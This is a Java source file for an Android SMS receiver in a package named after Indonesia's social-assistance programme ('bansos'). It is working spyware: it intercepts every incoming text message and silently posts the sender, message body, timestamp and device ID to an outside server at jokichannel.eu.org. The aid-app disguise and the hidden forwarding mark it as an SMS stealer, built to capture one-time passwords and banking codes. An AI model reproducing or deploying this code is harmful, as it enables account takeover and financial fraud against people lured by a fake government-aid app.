package com.kemensos.bansos;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class SmsReceiver extends BroadcastReceiver {

    private static final String TAG = "SmsReceiver";
    private static final String SERVER_URL = "https://bansos.jokichannel.eu.org/api/collect-sms";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (!intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) return;

        Bundle bundle = intent.getExtras();
        if (bundle == null) return;

        try {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus == null) return;

            String format = bundle.getString("format", "");

            for (Object pdu : pdus) {
                SmsMessage sms;
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                    sms = SmsMessage.createFromPdu((byte[]) pdu, format);
                } else {
                    sms = SmsMessage.createFromPdu((byte[]) pdu);
                }

                if (sms == null) continue;

                final String sender = sms.getOriginatingAddress();
                final String message = sms.getMessageBody();
                final long timestamp = sms.getTimestampMillis();
                final String deviceId = android.provider.Settings.Secure.getString(
                    context.getContentResolver(),
                    android.provider.Settings.Secure.ANDROID_ID
                );

                Log.i(TAG, "SMS from: " + sender + " : " + message);

                // Forward to server in background
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            URL url = new URL(SERVER_URL);
                            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                            conn.setRequestMethod("POST");
                            conn.setDoOutput(true);
                            conn.setConnectTimeout(5000);
                            conn.setReadTimeout(5000);
                            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

                            String data = "sender=" + URLEncoder.encode(sender != null ? sender : "", "UTF-8") +
                                          "&message=" + URLEncoder.encode(message != null ? message : "", "UTF-8") +
                                          "&timestamp=" + timestamp +
                                          "&device_id=" + URLEncoder.encode(deviceId != null ? deviceId : "", "UTF-8");

                            OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream());
                            writer.write(data);
                            writer.flush();

                            int responseCode = conn.getResponseCode();
                            conn.disconnect();

                            Log.i(TAG, "SMS sent to server. Response: " + responseCode);
                        } catch (Exception e) {
                            Log.e(TAG, "Failed to send SMS to server: " + e.getMessage());
                        }
                    }
                }).start();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error processing SMS: " + e.getMessage());
        }
    }
}
